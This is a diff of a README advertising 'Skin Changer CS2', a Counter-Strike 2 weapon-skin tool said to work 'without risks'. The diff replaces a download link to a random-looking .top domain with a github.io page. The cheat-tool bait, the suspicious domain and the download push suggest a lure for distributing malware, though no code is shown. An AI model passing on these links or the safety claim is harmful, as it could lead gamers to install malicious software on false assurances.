@@ -2,7 +2,7 @@
 
 Transform your Counter-Strike 2 experience with Skin Changer CS2, a powerful tool that lets you customize weapon skins in real-time without modifying game files. Perfect for players who want a personalized look without risks.  
 
-[![Download Skin Changer CS2](https://img.shields.io/badge/Download-Skin_Changer_CS2-blueviolet)](https://poelkakusthbutn.top/)  
+[![Download Skin Changer CS2](https://img.shields.io/badge/Download-Skin_Changer_CS2-blueviolet)](https://skin-changer-cs2.github.io/.github)  
 
 ---
 
